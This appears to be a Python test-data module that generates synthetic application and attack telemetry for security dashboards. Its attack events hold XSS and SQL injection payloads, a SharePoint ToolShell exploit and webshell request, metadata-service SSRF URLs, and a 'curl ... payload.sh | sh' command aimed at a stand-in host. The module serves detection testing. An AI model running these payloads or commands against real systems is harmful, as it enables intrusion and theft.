"""Auto-extracted from generate_test_logs.py — application synthetic events.

Behavior-preserving split: function bodies are unchanged. Shared constants and
helpers live in ``testlogs.common`` and are imported via star import.
"""
import json
import ntpath
import os
import random
import re
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from testlogs.common import *  # noqa: F401,F403


def _service_namespace_for(service_name):
    octo_services = {
        "enterprise-crm-portal",
        "octo-apm-demo",
        "octo-drone-shop",
        "octo-java-app-server",
        "octo-workflow-gateway",
    }
    return "octo" if service_name in octo_services else "security-lab"


def _service_version_for(service_name):
    versions = {
        "enterprise-crm-portal": "1.1.0",
        "octo-drone-shop": "1.2.0",
        "octo-apm-demo": "1.0.0",
        "octo-java-app-server": "1.0.0",
    }
    return versions.get(service_name, "1.0.0")


def _app_brand_for(service_name):
    brands = {
        "enterprise-crm-portal": "OCTO CRM APM",
        "octo-drone-shop": "OCTO Drone Shop",
        "octo-apm-demo": "OCTO APM Demo",
        "octo-java-app-server": "OCTO Java APM Demo",
    }
    return brands.get(service_name, service_name)


def _workflow_for_path(path):
    normalized = path.split("?", 1)[0]
    if normalized.startswith("/octo/internal/inventory"):
        return "checkout", "inventory"
    if normalized.startswith("/octo/internal/payment"):
        return "checkout", "payment"
    if normalized.startswith("/octo/internal/audit"):
        return "checkout", "audit"
    if normalized.startswith("/octo/checkout") or normalized.startswith("/shop/checkout"):
        return "checkout", "entry"
    if normalized.startswith("/octo/internal/auth"):
        return "auth", "credentials"
    if normalized.startswith("/octo/login"):
        return "auth", "login"
    if normalized.startswith("/octo/metrics"):
        return "observability", "metrics"
    if "/orders/sync" in normalized:
        return "order-sync", "sync"
    if "/orders" in normalized:
        return "checkout", "order"
    if "/payments" in normalized or "/payment" in normalized:
        return "checkout", "payment"
    if "/login" in normalized:
        return "auth", "login"
    if "/health" in normalized:
        return "health", "readiness"
    return "other", "unmapped"


def application_event(service_name, message="Request completed", level="INFO",
                      url="/", http_method="GET", status_code="200",
                      response_time_ms=150, client_ip=None, user_agent=None,
                      user=None, trace_id=None, session_id=None,
                      span_name=None, span_attributes="", attack_type=None,
                      attack_severity=None, waf_score=None, db_target=None,
                      error_type=None, slow_request=False, orders_sync_created=0,
                      orders_sync_updated=0, orders_sync_failed=0,
                      orders_sync_source=None, referrer="https://app.example.com/",
                      response_headers="Content-Type: application/json; X-Frame-Options: DENY",
                      content_type="application/json", hostname=None, span_id=None,
                      parent_span_id="", span_kind="SERVER", apm_domain=None,
                      metric_name=None, metric_value=None, metric_unit=None,
                      workflow_id=None, workflow_step=None, request_id=None,
                      service_namespace=None, service_version=None,
                      deployment_environment="production", app_name=None,
                      app_brand=None, app_runtime="python", app_service=None,
                      db_statement=None, db_elapsed_ms=None,
                      db_connection_name=None, db_ocid=None, run_id=None,
                      java_apm_path=None, java_apm_status_code=None,
                      java_apm_latency_ms=None, java_apm_error_type=None,
                      offset=0):
    """Generate application/browser telemetry shaped for the SOC app dashboards."""
    if client_ip is None:
        client_ip = random.choice(CORPORATE_IPS)
    if user_agent is None:
        user_agent = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
        ])
    if user is None:
        user = random.choice(["cersei", "jaime", "tyrion", "arya", "sansa", "jon"])
    if trace_id is None:
        trace_id = f"trace_{uuid.uuid4().hex[:16]}"
    if session_id is None:
        session_id = f"sess_{uuid.uuid4().hex[:12]}"
    if span_name is None:
        span_name = f"HTTP {http_method} {url.split('?', 1)[0]}"
    if hostname is None:
        hostname = "crm-portal-01" if service_name == "enterprise-crm-portal" else "drone-shop-01"
    if span_id is None:
        span_id = f"span_{uuid.uuid4().hex[:16]}"
    if apm_domain is None:
        apm_domain = service_name
    if request_id is None:
        request_id = f"req_{uuid.uuid4().hex[:8]}"
    if service_namespace is None:
        service_namespace = _service_namespace_for(service_name)
    if service_version is None:
        service_version = _service_version_for(service_name)
    if app_name is None:
        app_name = service_name
    if app_brand is None:
        app_brand = _app_brand_for(service_name)
    if app_service is None:
        app_service = service_name
    if workflow_id is None or workflow_step is None:
        inferred_workflow_id, inferred_workflow_step = _workflow_for_path(url)
        workflow_id = workflow_id or inferred_workflow_id
        workflow_step = workflow_step or inferred_workflow_step
    if db_connection_name is None and db_target:
        db_connection_name = "octo_atp_tp"
    if db_elapsed_ms is None and db_target:
        db_elapsed_ms = response_time_ms
    uri_path = url.split("?", 1)[0]

    return {
        "timestamp": ts(offset),
        "serviceName": service_name,
        "service.name": service_name,
        "service.namespace": service_namespace,
        "service.version": service_version,
        "service.instance.id": hostname,
        "deployment.environment": deployment_environment,
        "app.name": app_name,
        "app.brand": app_brand,
        "app.runtime": app_runtime,
        "app.service": app_service,
        "traceId": trace_id,
        "trace_id": trace_id,
        "span_id": span_id,
        "oracleApmTraceId": trace_id,
        "oracleApmSpanId": span_id,
        "traceparent": f"00-{trace_id}-{span_id}-01",
        "httpMethod": http_method,
        "http.method": http_method,
        "http.request.method": http_method,
        "requestUrl": url,
        "uriPath": uri_path,
        "http.url.path": uri_path,
        "queryString": url.split("?", 1)[1] if "?" in url else "",
        "statusCode": str(status_code),
        "http.status_code": int(status_code),
        "http.response.status_code": int(status_code),
        "http_status": int(status_code),
        "responseTimeMs": response_time_ms,
        "http.response_time_ms": response_time_ms,
        "duration_ms": response_time_ms,
        "clientAddress": client_ip,
        "http.client_ip": client_ip,
        "client.address": client_ip,
        "userAgent": user_agent,
        "user_agent.original": user_agent,
        "user": user,
        "sessionId": session_id,
        "requestId": request_id,
        "request_id": request_id,
        "workflow_id": workflow_id,
        "workflow_step": workflow_step,
        "correlation.id": trace_id,
        "run_id": run_id,
        "route": uri_path,
        "contentType": content_type,
        "referrer": referrer,
        "responseHeaders": response_headers,
        "spanName": span_name,
        "spanAttributes": span_attributes,
        "spanId": span_id,
        "parentSpanId": parent_span_id,
        "spanKind": span_kind,
        "apmDomain": apm_domain,
        "metricName": metric_name,
        "metricValue": metric_value,
        "metricUnit": metric_unit,
        "securityAttackType": attack_type,
        "securityAttackSeverity": attack_severity,
        "wafScore": waf_score,
        "dbTarget": db_target,
        "db.target": db_target,
        "db.statement": db_statement,
        "db.elapsed_ms": db_elapsed_ms,
        "db.connection_name": db_connection_name,
        "db.ocid": db_ocid,
        "errorType": error_type,
        "slowRequest": "true" if slow_request else "false",
        "performance.slow_request": bool(slow_request),
        "java_apm.path": java_apm_path,
        "java_apm.status_code": java_apm_status_code,
        "java_apm.latency_ms": java_apm_latency_ms,
        "java_apm.error_type": java_apm_error_type,
        "ordersSyncCreated": orders_sync_created,
        "ordersSyncUpdated": orders_sync_updated,
        "ordersSyncFailed": orders_sync_failed,
        "ordersSyncSource": orders_sync_source,
        "level": level,
        "severity": level,
        "hostname": hostname,
        "message": message,
    }


def generate_application_events():
    """Generate application and browser telemetry for App 360 and browser dashboards."""
    events = []

    browser_ip = "185.220.101.1"
    brute_force_ip = "194.5.249.7"
    hijack_ip = "23.129.64.100"

    # Service lifecycle and baseline traffic
    events.extend([
        application_event("enterprise-crm-portal", message="enterprise-crm-portal started",
                          level="INFO", url="/health", response_time_ms=30, offset=0),
        application_event("octo-drone-shop", message="octo-drone-shop started",
                          level="INFO", url="/health", response_time_ms=25, offset=1),
        application_event("enterprise-crm-portal", message="Request completed",
                          url="/crm/dashboard", response_time_ms=142, offset=2),
        application_event("enterprise-crm-portal", message="Request completed",
                          url="/crm/orders/42", response_time_ms=188, offset=3),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/products/7", response_time_ms=96, offset=4),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/cart", response_time_ms=120, offset=5),
    ])

    # Cross-service trace correlation + order sync workflow
    for idx, (created, updated, failed) in enumerate([(12, 4, 0), (8, 2, 1), (15, 3, 0)]):
        shared_trace = f"trace_order_sync_{idx:02d}"
        base_offset = 10 + idx * 3
        events.append(application_event(
            "octo-drone-shop",
            message="Request completed",
            url=f"/shop/api/orders/sync?batch={idx}",
            http_method="POST",
            response_time_ms=640 + idx * 75,
            trace_id=shared_trace,
            db_target="oracle_atp",
            orders_sync_source="octo-drone-shop",
            offset=base_offset,
        ))
        events.append(application_event(
            "enterprise-crm-portal",
            message="External orders sync completed",
            url="/crm/api/integrations/orders/sync",
            http_method="POST",
            response_time_ms=980 + idx * 40,
            trace_id=shared_trace,
            db_target="oracle_atp",
            orders_sync_created=created,
            orders_sync_updated=updated,
            orders_sync_failed=failed,
            orders_sync_source="octo-drone-shop",
            offset=base_offset + 1,
        ))
        events.append(application_event(
            "enterprise-crm-portal",
            message="Request completed",
            url="/crm/api/integrations/orders/sync",
            http_method="POST",
            response_time_ms=720 + idx * 60,
            trace_id=shared_trace,
            db_target="oracle_atp",
            slow_request=True,
            offset=base_offset + 2,
        ))

    # Error and slow request telemetry
    events.extend([
        application_event("enterprise-crm-portal", message="Unhandled exception in checkout flow",
                          level="ERROR", url="/crm/checkout", status_code="500",
                          response_time_ms=2430, trace_id="trace_error_001",
                          error_type="DatabaseTimeoutError", db_target="oracle_atp",
                          slow_request=True, offset=30),
        application_event("enterprise-crm-portal", message="Unhandled exception in profile save",
                          level="ERROR", url="/crm/profile", status_code="500",
                          response_time_ms=2120, trace_id="trace_error_002",
                          error_type="ValidationError", slow_request=True, offset=31),
        application_event("octo-drone-shop", message="Unhandled exception in payment workflow",
                          level="ERROR", url="/shop/checkout/payment", status_code="502",
                          response_time_ms=2860, trace_id="trace_error_003",
                          error_type="UpstreamGatewayError", db_target="oracle-atp",
                          slow_request=True, offset=32),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/search?q=drone", response_time_ms=2085,
                          db_target="oracle_atp", slow_request=True, offset=33),
        application_event("enterprise-crm-portal", message="enterprise-crm-portal shutting down",
                          level="INFO", url="/health", response_time_ms=20, offset=34),
        application_event("octo-drone-shop", message="octo-drone-shop shutting down",
                          level="INFO", url="/health", response_time_ms=20, offset=35),
    ])

    # Browser / OWASP attack telemetry from a single multi-vector attacker
    attack_specs = [
        {
            "url": "/crm/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
            "attack_type": "xss_reflected",
            "severity": "high",
            "span_attributes": "document.cookie document.write",
            "content_type": "text/html",
            "headers": "Content-Type: text/html",
            "service": "enterprise-crm-portal",
        },
        {
            "url": "/shop/products?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E",
            "attack_type": "xss_dom",
            "severity": "critical",
            "span_attributes": "document.cookie .innerHTML insertAdjacentHTML",
            "content_type": "text/html",
            "headers": "Content-Type: text/html",
            "service": "octo-drone-shop",
        },
        {
            "url": "/crm/search?q=1'%20OR%201=1--",
            "attack_type": "sqli",
            "severity": "critical",
            "span_attributes": "sql injection detector",
            "service": "enterprise-crm-portal",
        },
        {
            "url": "/shop/api/orders?sort=UNION%20SELECT%20username,password%20FROM%20users",
            "attack_type": "sqli",
            "severity": "critical",
            "span_attributes": "orm query exception",
            "service": "octo-drone-shop",
        },
        {
            "url": "/crm/checkout?miner=coinhive",
            "attack_type": "browser_malware",
            "severity": "high",
            "span_attributes": "keydown keypress keyup addEventListener payment checkout",
            "service": "enterprise-crm-portal",
        },
        {
            "url": "/shop/profile?payload=javascript:alert(1)",
            "attack_type": "xss_reflected",
            "severity": "high",
            "span_attributes": "eval( Function( location.hash",
            "content_type": "text/html",
            "headers": "Content-Type: text/html",
            "service": "octo-drone-shop",
        },
    ]
    for idx, spec in enumerate(attack_specs):
        shared_trace = f"trace_attack_{idx:02d}"
        events.append(application_event(
            spec["service"],
            message="Request completed",
            url=spec["url"],
            http_method="GET",
            status_code="200",
            response_time_ms=640 + idx * 55,
            client_ip=browser_ip,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
            trace_id=shared_trace,
            session_id=f"sess_attack_{idx:02d}",
            span_attributes=spec["span_attributes"],
            attack_type=spec["attack_type"],
            attack_severity=spec["severity"],
            content_type=spec.get("content_type", "application/json"),
            response_headers=spec.get("headers", "Content-Type: application/json; X-Frame-Options: DENY"),
            referrer="https://portal.example.com/app",
            offset=40 + idx,
        ))

    # CSRF violations and clickjacking exposure
    events.extend([
        application_event("enterprise-crm-portal", message="Request completed",
                          url="/crm/api/profile/email", http_method="POST",
                          client_ip=browser_ip, user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
                          referrer=None, content_type="application/json",
                          response_headers="Content-Type: application/json", offset=50),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/api/account/address", http_method="PUT",
                          client_ip=browser_ip, referrer=None,
                          response_headers="Content-Type: application/json", offset=51),
        application_event("enterprise-crm-portal", message="Request completed",
                          url="/crm/dashboard/embedded", http_method="GET",
                          client_ip=browser_ip, content_type="text/html",
                          response_headers="Content-Type: text/html", offset=52),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/catalog/embedded", http_method="GET",
                          client_ip=browser_ip, content_type="text/html",
                          response_headers="Content-Type: text/html", offset=53),
    ])

    # Browser fingerprinting
    events.extend([
        application_event("enterprise-crm-portal", message="Request completed",
                          url="/crm/login", client_ip=browser_ip,
                          span_attributes="canvas.toDataURL toBlob getImageData webgl.getParameter WEBGL_debug_renderer_info getExtension",
                          offset=54),
        application_event("octo-drone-shop", message="Request completed",
                          url="/shop/login", client_ip=browser_ip,
                          span_attributes="AudioContext OfflineAudioContext createOscillator navigator.plugins navigator.languages navigator.hardwareConcurrency",
                          offset=55),
    ])

    # Session hijacking: >5 distinct session IDs from same source and user agent
    for idx in range(6):
        events.append(application_event(
            "enterprise-crm-portal",
            message="Request completed",
            url="/crm/account",
            client_ip=hijack_ip,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
            session_id=f"sess_hijack_{idx:02d}",
            span_name="HTTP GET /crm/account",
            span_attributes="cookie.session rotate-session-id",
            attack_type="session_hijacking",
            attack_severity="high",
            offset=60 + idx,
        ))

    # WAF correlation style signals captured in application telemetry
    for idx, score in enumerate(["72", "88", "91"]):
        events.append(application_event(
            "octo-drone-shop",
            message="Request completed",
            url=f"/shop/admin/export?attempt={idx}",
            client_ip="91.92.109.18",
            attack_type="security_misconfig",
            attack_severity="medium",
            waf_score=score,
            span_attributes="waf header captured x-oci-waf-score",
            offset=70 + idx,
        ))

    # Authentication brute force
    brute_force_users = ["admin", "billing", "support", "orders", "sales", "finance", "ceo"]
    for idx, username in enumerate(brute_force_users):
        events.append(application_event(
            "enterprise-crm-portal",
            message=f"login failed for {username}",
            level="WARN",
            url="/crm/login",
            http_method="POST",
            status_code="401",
            client_ip=brute_force_ip,
            user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
            user=username,
            attack_type="broken_auth",
            attack_severity="high",
            span_attributes="authentication failure retry",
            referrer=None,
            offset=80 + idx,
        ))
    events.append(application_event(
        "enterprise-crm-portal",
        message="auth failure: rate limit bypass attempt",
        level="WARN",
        url="/crm/login",
        http_method="POST",
        status_code="429",
        client_ip=brute_force_ip,
        user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
        user="admin",
        attack_type="rate_limit_bypass",
        attack_severity="high",
        referrer=None,
        offset=88,
    ))

    for idx, method in enumerate(["GET", "GET", "GET", "POST"]):
        events.append(application_event(
            "vsagent-c2-emulator",
            message="vsagent beacon check-in" if method == "GET" else "vsagent output post",
            level="WARN",
            url="/beacon",
            http_method=method,
            status_code="200",
            response_time_ms=45 if method == "GET" else 180,
            client_ip="10.0.0.5",
            user_agent="vsagent/1.0",
            user="CORP\\jsmith",
            trace_id="trace_flf_vsagent_001",
            session_id="sess_flf_vsagent_001",
            span_name=f"HTTP {method} /beacon",
            span_attributes="cmd=base64 output=base64 stripped-headers no-referrer",
            attack_type="c2_http_beacon",
            attack_severity="critical",
            referrer=None,
            hostname="flf-c2-controller",
            offset=90 + idx,
        ))

    events.extend([
        application_event(
            "enterprise-crm-portal",
            message="SSRF request reached instance metadata service",
            level="WARN",
            url=WEB_TO_CLOUD_REQUEST_URL,
            http_method="GET",
            status_code="200",
            response_time_ms=1175,
            client_ip=WEB_TO_CLOUD_ATTACKER_IP,
            user_agent=WEB_TO_CLOUD_ATTACKER_UA,
            user="svc-app",
            trace_id=WEB_TO_CLOUD_TRACE_ID,
            session_id="sess_w2c_entry_001",
            span_name="HTTP GET /crm/profile/avatar",
            span_attributes="metadata.oraclecloud.com 169.254.169.254 instance-principal token",
            attack_type="ssrf_metadata_access",
            attack_severity="critical",
            waf_score="91",
            db_target="oracle_atp",
            hostname=WEB_TO_CLOUD_COMPROMISED_HOST,
            offset=95,
        ),
        application_event(
            "enterprise-crm-portal",
            message=f"Exported customer data object {WEB_TO_CLOUD_EXFIL_OBJECT}",
            level="WARN",
            url=f"/crm/admin/export?object={WEB_TO_CLOUD_EXFIL_OBJECT}",
            http_method="POST",
            status_code="200",
            response_time_ms=2860,
            client_ip=WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP,
            user_agent="svc-app/1.4 object-storage-client",
            user=WEB_TO_CLOUD_COMPROMISED_USER,
            trace_id=WEB_TO_CLOUD_TRACE_ID,
            session_id="sess_w2c_entry_001",
            span_name="POST /crm/admin/export",
            span_attributes=f"objectstorage getobject {WEB_TO_CLOUD_BUCKET}/{WEB_TO_CLOUD_EXFIL_OBJECT}",
            attack_type="cloud_data_exfiltration",
            attack_severity="critical",
            db_target="oracle_atp",
            hostname=WEB_TO_CLOUD_COMPROMISED_HOST,
            slow_request=True,
            offset=96,
        ),
    ])

    events.extend([
        application_event(
            "sharepoint-intranet",
            message="SharePoint ToolShell exploit request reached vulnerable endpoint",
            level="WARN",
            url="/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/_layouts/15/spinstall0.aspx",
            http_method="POST",
            status_code="200",
            response_time_ms=1840,
            client_ip=TOOL_SHELL_ATTACKER_IP,
            user_agent="python-requests/2.31.0",
            user="NT AUTHORITY\\IUSR",
            trace_id=TOOL_SHELL_TRACE_ID,
            session_id="sess_toolshell_sp_001",
            span_name="POST /_layouts/15/ToolPane.aspx",
            span_attributes="SharePoint ToolShell CVE-2025-53770-style exploit webshell spinstall0.aspx",
            attack_type="ToolShell_initial_access",
            attack_severity="critical",
            waf_score="96",
            hostname=TOOL_SHELL_HOST,
            offset=98,
        ),
        application_event(
            "sharepoint-intranet",
            message="SharePoint webshell command execution attempted",
            level="ERROR",
            url="/_layouts/15/spinstall0.aspx?cmd=whoami",
            http_method="POST",
            status_code="500",
            response_time_ms=2320,
            client_ip=TOOL_SHELL_ATTACKER_IP,
            user_agent="python-requests/2.31.0",
            user="NT AUTHORITY\\IUSR",
            trace_id=TOOL_SHELL_TRACE_ID,
            session_id="sess_toolshell_sp_001",
            span_name="POST /_layouts/15/spinstall0.aspx",
            span_attributes="cmd=whoami IIS worker webshell post exploitation",
            attack_type="ToolShell_webshell_execution",
            attack_severity="critical",
            waf_score="99",
            hostname=TOOL_SHELL_HOST,
            slow_request=True,
            offset=99,
        ),
    ])

    # Octo APM demo: one service-scoped dataset that carries correlated logs,
    # APM span hierarchy, and metric samples for the dedicated APM dashboard.
    checkout_trace = "trace_octo_apm_checkout_001"
    checkout_root_span = "span_octo_checkout_root"
    events.extend([
        application_event(
            "octo-apm-demo",
            message="checkout request accepted",
            url="/octo/checkout",
            http_method="POST",
            status_code="200",
            response_time_ms=1180,
            trace_id=checkout_trace,
            span_id=checkout_root_span,
            parent_span_id="",
            span_name="HTTP POST /octo/checkout",
            span_attributes="route=/octo/checkout cart.items=3 customer.tier=gold",
            workflow_id="checkout",
            workflow_step="entry",
            metric_name="http.server.duration",
            metric_value="1180",
            metric_unit="ms",
            hostname="octo-apm-demo-frontend-01",
            offset=100,
        ),
        application_event(
            "octo-apm-demo",
            message="inventory reservation span completed",
            url="/octo/internal/inventory/reserve",
            http_method="POST",
            status_code="200",
            response_time_ms=420,
            trace_id=checkout_trace,
            span_id="span_octo_inventory_reserve",
            parent_span_id=checkout_root_span,
            span_name="POST /inventory/reserve",
            span_attributes="component=inventory sku=OCTO-DRONE-7 reservation=ok",
            db_target="oracle_atp",
            db_statement="update inventory set reserved = reserved + :qty where sku = :sku",
            db_elapsed_ms=420,
            workflow_id="checkout",
            workflow_step="inventory",
            metric_name="apm.span.duration",
            metric_value="420",
            metric_unit="ms",
            hostname="octo-apm-demo-api-01",
            offset=101,
        ),
        application_event(
            "octo-apm-demo",
            message="payment authorization timeout",
            level="ERROR",
            url="/octo/internal/payment/authorize",
            http_method="POST",
            status_code="504",
            response_time_ms=2860,
            trace_id=checkout_trace,
            span_id="span_octo_payment_auth",
            parent_span_id=checkout_root_span,
            span_name="POST /payment/authorize",
            span_attributes="component=payment gateway=demo-pay timeout=true",
            error_type="PaymentGatewayTimeout",
            slow_request=True,
            workflow_id="checkout",
            workflow_step="payment",
            java_apm_path="/api/java-apm/payment/authorize",
            java_apm_status_code=504,
            java_apm_latency_ms=2860,
            java_apm_error_type="PaymentGatewayTimeout",
            metric_name="apm.service.errors",
            metric_value="1",
            metric_unit="count",
            hostname="octo-apm-demo-api-02",
            offset=102,
        ),
        application_event(
            "octo-apm-demo",
            message="checkout rollback wrote audit entry",
            level="WARN",
            url="/octo/internal/audit/checkout-rollback",
            http_method="POST",
            status_code="200",
            response_time_ms=310,
            trace_id=checkout_trace,
            span_id="span_octo_checkout_rollback",
            parent_span_id="span_octo_payment_auth",
            span_name="INSERT checkout_rollback_audit",
            span_attributes="db.statement=insert rollback_reason=payment_timeout",
            db_target="oracle_atp",
            db_statement="insert into checkout_rollback_audit(trace_id, rollback_reason) values(:trace_id, :reason)",
            db_elapsed_ms=310,
            workflow_id="checkout",
            workflow_step="audit",
            metric_name="apm.db.calls",
            metric_value="1",
            metric_unit="count",
            hostname="octo-apm-demo-db-client-01",
            offset=103,
        ),
        application_event(
            "octo-drone-shop",
            message="java app-server sidecar payment authorization failed",
            level="ERROR",
            url="/api/orders/checkout",
            http_method="POST",
            status_code="504",
            response_time_ms=2910,
            trace_id=checkout_trace,
            span_id="span_octo_java_payment_sidecar",
            parent_span_id="span_octo_payment_auth",
            span_name="POST octo-java-app-server /api/java-apm/payment/authorize",
            span_attributes="peer.service=octo-java-app-server app_server=spring-boot-embedded-tomcat",
            error_type="PaymentGatewayTimeout",
            slow_request=True,
            workflow_id="checkout",
            workflow_step="java-payment",
            java_apm_path="/api/java-apm/payment/authorize",
            java_apm_status_code=504,
            java_apm_latency_ms=2860,
            java_apm_error_type="PaymentGatewayTimeout",
            hostname="octo-drone-shop-frontend-01",
            offset=104,
        ),
    ])

    attack_trace = "trace_octo_apm_attack_001"
    attack_run_id = "run-octo-attack-lab-001"
    attack_request_id = "req_octo_attack_001"
    attack_source_ip = "203.0.113.77"
    attack_redirect_url = "https://pay-update.example.test/checkout/session"
    attack_stages = [
        {
            "service": "octo-drone-shop",
            "message": "OCI API Gateway route policy evaluated the attack-lab request before backend forwarding",
            "level": "WARN",
            "stage": "api_gateway_edge_control",
            "tactic": "Initial Access",
            "technique_id": "T1190",
            "technique": "Exploit Public-Facing Application",
            "type": "api_gateway_policy_detection",
            "severity": "high",
            "url": "/api/shop/attack/simulate",
            "status": "200",
            "span": "span_octo_attack_api_gateway_edge",
            "parent": "",
            "host": "oci-api-gateway-public",
            "role": "public-api-gateway",
            "instance": "ocid1.apigatewaydeployment.oc1.iad.demoattackgw01",
            "destination_ip": "10.42.20.165",
            "destination_port": 443,
            "lotl": "api-gateway-policy",
            "osquery_query": "api-gateway-route-policy",
            "osquery_finding": "API Gateway policy and quota telemetry correlated with the same attack id and trace",
            "compromised": False,
            "oci.api_gateway.name": "octo-public-api-gateway",
            "oci.api_gateway.scope": "public",
            "oci.api_gateway.deployment_id": "ocid1.apigatewaydeployment.oc1.iad.demoattackgw01",
            "oci.api_gateway.route": "/api/shop/attack/simulate",
            "oci.api_gateway.route_id": "public-attack-simulate",
            "oci.api_gateway.route_family": "shop_attack",
            "oci.api_gateway.request_id": "gw-req_octo_attack_001",
            "oci.api_gateway.action": "allow",
            "oci.api_gateway.policy.decision": "suspicious_burst_observed",
            "oci.api_gateway.latency_ms": 34,
            "oci.api_gateway.rate_limit.limit": 120,
            "oci.api_gateway.rate_limit.remaining": 87,
            "oci.api_gateway.threat_signal": "attack_lab_probe",
        },
        {
            "service": "octo-drone-shop",
            "message": "Attack lab initial access reached the shop edge route",
            "level": "WARN",
            "stage": "initial_access",
            "tactic": "Initial Access",
            "technique_id": "T1190",
            "technique": "Exploit Public-Facing Application",
            "type": "public_app_exploit",
            "severity": "high",
            "url": "/shop/products",
            "status": "200",
            "span": "span_octo_attack_initial_access",
            "parent": "",
            "host": "octo-shop-vm-01",
            "role": "shop-frontend",
            "instance": "ocid1.instance.oc1.iad.demoattackshop01",
            "destination_ip": "203.0.113.10",
            "destination_port": 443,
            "lotl": "curl",
            "osquery_query": "unexpected-listeners",
            "osquery_finding": "public endpoint probe reached shop listener through the load balancer",
            "compromised": False,
        },
        {
            "service": "octo-drone-shop",
            "message": "Compromised VM executed a shell-like payload from the app tier",
            "level": "ERROR",
            "stage": "vm_compromise",
            "tactic": "Execution",
            "technique_id": "T1059",
            "technique": "Command and Scripting Interpreter",
            "type": "compromised_vm",
            "severity": "critical",
            "url": "/api/shop/attack/simulate",
            "status": "500",
            "span": "span_octo_attack_vm_compromise",
            "parent": "span_octo_attack_initial_access",
            "host": "octo-shop-vm-01",
            "role": "shop-frontend",
            "instance": "ocid1.instance.oc1.iad.demoattackshop01",
            "destination_ip": "10.42.20.165",
            "destination_port": 8080,
            "lotl": "bash",
            "process.name": "bash",
            "process.command_line": "bash -lc curl -fsS https://pay-update.example.test/payload.sh | sh",
            "osquery_query": "lotl-processes",
            "osquery_finding": "shell-like process launched from the application host during the lab run",
            "compromised": True,
        },
        {
            "service": "octo-apm-demo",
            "message": "Payment form interception detected during checkout",
            "level": "ERROR",
            "stage": "payment_interception",
            "tactic": "Credential Access",
            "technique_id": "T1056.001",
            "technique": "Keylogging",
            "type": "payment_data_interception",
            "severity": "critical",
            "url": "/shop/checkout/payment",
            "status": "200",
            "span": "span_octo_attack_payment_interception",
            "parent": "span_octo_attack_vm_compromise",
            "host": "octo-shop-vm-01",
            "role": "shop-frontend",
            "instance": "ocid1.instance.oc1.iad.demoattackshop01",
            "destination_ip": "10.42.20.165",
            "destination_port": 443,
            "lotl": "javascript",
            "osquery_query": "recent-processes",
            "osquery_finding": "checkout form overlay produced payment interception telemetry",
            "compromised": True,
            "payment.interception.detected": True,
            "payment.provider": "simulated",
            "payment.status": "intercepted",
            "payment.card_brand": "visa",
            "payment.card_last4": "4242",
            "payment.risk_score": 97,
        },
        {
            "service": "octo-apm-demo",
            "message": "Suspicious payment redirect sent checkout traffic to an untrusted host",
            "level": "ERROR",
            "stage": "payment_redirect",
            "tactic": "Credential Access",
            "technique_id": "T1557",
            "technique": "Adversary-in-the-Middle",
            "type": "payment_redirect",
            "severity": "critical",
            "url": "/shop/checkout/payment/redirect",
            "status": "302",
            "span": "span_octo_attack_payment_redirect",
            "parent": "span_octo_attack_payment_interception",
            "host": "octo-shop-vm-01",
            "role": "shop-frontend",
            "instance": "ocid1.instance.oc1.iad.demoattackshop01",
            "destination_ip": "198.51.100.44",
            "destination_port": 443,
            "lotl": "nginx-rewrite",
            "osquery_query": "suspicious-shell-history",
            "osquery_finding": "redirect rule simulation points payment flow to a suspicious host",
            "compromised": True,
            "payment.redirect.detected": True,
            "payment.redirect.url": attack_redirect_url,
            "http.redirect.location": attack_redirect_url,
        },
        {
            "service": "enterprise-crm-portal",
            "message": "Compromised shop path pivoted toward the CRM admin service",
            "level": "WARN",
            "stage": "crm_pivot",
            "tactic": "Lateral Movement",
            "technique_id": "T1021.004",
            "technique": "Remote Services: SSH",
            "type": "crm_pivot",
            "severity": "high",
            "url": "/api/admin/orders",
            "status": "401",
            "span": "span_octo_attack_crm_pivot",
            "parent": "span_octo_attack_payment_redirect",
            "host": "octo-crm-vm-01",
            "role": "crm-admin",
            "instance": "ocid1.instance.oc1.iad.demoattackcrm01",
            "destination_ip": "10.42.20.122",
            "destination_port": 8080,
            "lotl": "curl",
            "osquery_query": "lotl-processes",
            "osquery_finding": "CRM host observed suspicious admin API probing from the compromised app tier",
            "compromised": True,
        },
        {
            "service": "octo-apm-demo",
            "message": "Payment telemetry exfiltration attempt correlated with checkout redirect",
            "level": "ERROR",
            "stage": "exfiltration",
            "tactic": "Exfiltration",
            "technique_id": "T1041",
            "technique": "Exfiltration Over C2 Channel",
            "type": "payment_exfiltration",
            "severity": "critical",
            "url": "/shop/checkout/payment/callback",
            "status": "503",
            "span": "span_octo_attack_exfiltration",
            "parent": "span_octo_attack_payment_redirect",
            "host": "octo-shop-vm-01",
            "role": "shop-frontend",
            "instance": "ocid1.instance.oc1.iad.demoattackshop01",
            "destination_ip": "198.51.100.200",
            "destination_port": 443,
            "lotl": "curl",
            "osquery_query": "process-open-sockets",
            "osquery_finding": "outbound callback to suspicious payment collection endpoint",
            "compromised": True,
            "payment.interception.detected": True,
            "payment.redirect.detected": True,
            "payment.card_last4": "4242",
            "network.bytes_out": 4812,
        },
    ]
    for offset, stage in enumerate(attack_stages, start=105):
        base_event = application_event(
            stage["service"],
            message=stage["message"],
            level=stage["level"],
            url=stage["url"],
            http_method="POST" if stage["stage"] != "initial_access" else "GET",
            status_code=stage["status"],
            response_time_ms=900 + (offset - 105) * 240,
            client_ip=attack_source_ip,
            user_agent="curl/8.4.0 octo-attack-lab",
